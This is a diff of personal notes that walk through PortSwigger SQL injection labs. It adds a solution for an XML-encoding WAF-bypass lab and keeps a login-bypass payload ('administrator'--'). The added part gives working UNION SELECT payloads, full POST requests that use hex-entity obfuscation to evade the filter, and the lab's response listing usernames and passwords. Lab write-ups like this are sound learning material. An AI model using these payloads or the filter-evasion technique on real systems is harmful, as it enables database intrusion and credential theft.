@@ -1,5 +1,5 @@
 <span style="color:yellow;font-weight:700;font-size:30px">
-SQL injection
+SQL injection: 3 Labs
 </span>
 https://portswigger.net/web-security/sql-injection
 
@@ -24,6 +24,48 @@ To solve the lab, perform an SQL injection attack that logs in to the applicatio
 
 **payload:**
 > administrator'--
+
+
+# ***3. Lab: SQL injection with filter bypass via XML encoding***
+https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding
+
+
+obfuscating hint in JSON:
+    <storeId>
+        999 &#x53;ELECT * FROM information_schema.tables
+    </storeId>
+
+ The database contains a users table, which contains the usernames and passwords of registered users. To solve the lab, perform a SQL injection attack to retrieve the admin user's credentials, then log in to their account.
+
+**Hint:** A web application firewall (WAF) will block requests that contain obvious signs of a SQL injection attack. You'll need to find a way to obfuscate your malicious query to bypass this filter. We recommend using the Hackvertor extension to do this.
+
+1. check for number of columns and their support of string type values::
+> Union SELECT 'test' FROM information_schema.tables
+
+**request2**:
+> POST /product/stock HTTP/1.1
+>
+> <?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>4</productId><storeId>999 &#x75;nion &#x53;ELECT &apos;test&apos; FROM information_schema.tables</storeId></stockCheck>
+
+we know - 1 field, supports string
+
+2. payload to extract users and passwords:
+**request**
+> UNION SELECT username ||'  :   '|| password FROM users
+(note we cant use + signs instead of <space> since its xml not url...)
+>POST /product/stock HTTP/1.1
+>
+><?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>4</productId><storeId><@hex_entities>1 UNION SELECT username ||'~'|| password FROM users<@/hex_entities></storeId></stockCheck>
+
+response:
+> HTTP/1.1 200 OK
+>
+> administrator  :   bxjt82k71f9xgi1ne864
+> 617 units
+> wiener  :   tsxcut3s6e27f2whmyzq
+> carlos  :   ywmmiqxmwkqqysur22fg
+
+# Lab solved!
 
 
 <span style="color:yellow;font-weight:700;font-size:30px">
